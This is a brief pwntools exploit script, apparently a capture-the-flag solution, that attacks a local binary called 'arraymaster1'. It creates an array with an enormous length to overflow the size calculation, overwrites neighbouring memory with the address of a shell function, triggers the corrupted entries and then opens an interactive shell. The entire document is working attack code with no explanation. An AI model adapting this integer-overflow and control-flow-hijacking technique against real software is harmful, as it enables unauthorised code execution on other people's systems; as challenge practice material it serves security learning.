from pwn import *

SHELL = 0x0040126e

r = process("./arraymaster1")

r.sendlineafter(b">", b"init A 64 2305843009213693952")
r.sendlineafter(b">", b"init B 64 10")
r.sendlineafter(b">", b"init C 64 10")
r.sendlineafter(b">", b"init D 64 10")

for i in range(0, 40):
    r.sendlineafter(b">", f"set A {i} {SHELL}".encode())

r.sendlineafter(b">", b"get B 0")
r.sendlineafter(b">", b"get C 0")
r.sendlineafter(b">", b"get D 0")

r.interactive()
